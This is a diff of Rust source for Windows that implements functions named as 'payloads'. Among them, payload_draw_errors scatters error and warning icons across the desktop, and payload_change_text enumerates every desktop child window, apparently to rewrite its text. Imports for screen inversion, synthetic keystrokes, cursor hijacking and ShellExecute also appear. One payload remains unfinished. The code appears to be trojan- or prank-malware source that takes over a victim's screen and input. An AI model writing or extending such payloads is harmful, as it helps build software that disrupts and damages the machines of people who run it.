@@ -1,6 +1,9 @@
 use std::{mem::size_of, thread};
 
-use super::{define::PAYLOAD, system::msg_box_hook};
+use super::{
+    callback::{enum_child_proc, msg_box_hook},
+    define::PAYLOAD,
+};
 use crate::{
     convert_str::ToPCSTRWrapper,
     data::{
@@ -9,22 +12,23 @@ use crate::{
     },
     utils::log::{write_log, LogLocation, LogType},
     wrap_windows_api::{
-        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_messagebox_a,
+        wrap_get_current_thread_id, wrap_get_system_metrics, wrap_load_icon_a, wrap_messagebox_a,
         wrap_set_windows_hook_ex_a, wrap_shell_execute_a, wrap_unhook_windows_hook_ex, WinError,
     },
 };
 use windows::{
     core::PCSTR,
     Win32::{
-        Foundation::{GetLastError, HMODULE, HWND, POINT, RECT},
-        Graphics::Gdi::{BitBlt, GetWindowDC, NOTSRCCOPY},
+        Foundation::{GetLastError, HMODULE, HWND, LPARAM, POINT, RECT},
+        Graphics::Gdi::{BitBlt, GetWindowDC, ReleaseDC, NOTSRCCOPY},
         Media::Audio::{PlaySoundA, SND_ASYNC},
         System::LibraryLoader::GetModuleHandleA,
         UI::{
             Input::KeyboardAndMouse::{SendInput, INPUT, INPUT_KEYBOARD, VIRTUAL_KEY},
             WindowsAndMessaging::{
-                GetCursorPos, GetDesktopWindow, GetWindowRect, SetCursorPos, MB_ICONWARNING, MB_OK,
-                MB_SYSTEMMODAL, SM_CXICON, SM_CYICON, SW_SHOWDEFAULT, WH_CBT,
+                DrawIcon, EnumChildWindows, GetCursorPos, GetDesktopWindow, GetWindowRect,
+                LoadIconA, SetCursorPos, HICON, MB_ICONWARNING, MB_OK, MB_SYSTEMMODAL, SM_CXICON,
+                SM_CXSCREEN, SM_CYICON, SM_CYSCREEN, SW_SHOWDEFAULT, WH_CBT,
             },
         },
     },
@@ -293,20 +297,63 @@ fn payload_blink(_times: i32, _runtime: i32) -> i32 {
     100
 }
 
-fn payload_draw_errors(times: i32, runtime: i32) -> i32 {
+fn payload_draw_errors(times: i32, _runtime: i32) -> i32 {
     let (ix, iy) = (
         wrap_get_system_metrics(SM_CXICON).expect("Failed GetSystemMetrics"),
         wrap_get_system_metrics(SM_CYICON).expect("Failed GetSystemMetrics"),
     );
 
-    todo!()
+    let (scrw, scrh) = (
+        wrap_get_system_metrics(SM_CXSCREEN).expect("Failed GetSystemMetrics"),
+        wrap_get_system_metrics(SM_CYSCREEN).expect("Failed GetSystemMetrics"),
+    );
+
+    unsafe {
+        let hwnd = GetDesktopWindow();
+        let hdc = GetWindowDC(hwnd);
+
+        let mut cursor: POINT = Default::default();
+        GetCursorPos(&mut cursor);
+
+        let load_icon = wrap_load_icon_a(HMODULE(0), "IDI_ERROR").unwrap_or_default();
+
+        DrawIcon(hdc, cursor.x - ix, cursor.y - iy, load_icon);
+
+        if rand::random::<i32>() % (10.0 / (times as f32 / 500.0 + 1.0)) as i32 == 0 {
+            DrawIcon(
+                hdc,
+                rand::random::<i32>() % scrw,
+                rand::random::<i32>() % scrh,
+                wrap_load_icon_a(HMODULE(0), "IDI_WARNING").unwrap_or_default(),
+            );
+        }
+        if ReleaseDC(hwnd, hdc) == 0 {
+            #[cfg(not(feature = "DEBUG_MODE"))]
+            write_log(LogType::ERROR, LogLocation::MSG, "Failed ReleaseDC()\n");
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::ERROR, LogLocation::ALL, "Failed ReleaseDC()\n");
+            0
+        } else {
+            #[cfg(feature = "DEBUG_MODE")]
+            write_log(LogType::INFO, LogLocation::ALL, "SUCCESS ReleaseDC()");
+            1
+        }
+    }
 }
 
-fn payload_change_text(times: i32, runtime: i32) -> i32 {
-    todo!()
+fn payload_change_text(_times: i32, _runtime: i32) -> i32 {
+    unsafe {
+        EnumChildWindows(GetDesktopWindow(), Some(enum_child_proc), LPARAM::default());
+    }
+    50
 }
 
 fn payload_pip(times: i32, runtime: i32) -> i32 {
+    unsafe {
+        let hwnd = GetDesktopWindow();
+        let hdc = GetWindowDC(hwnd);
+        let rekt: RECT = Default::default();
+    }
     todo!()
 }
 
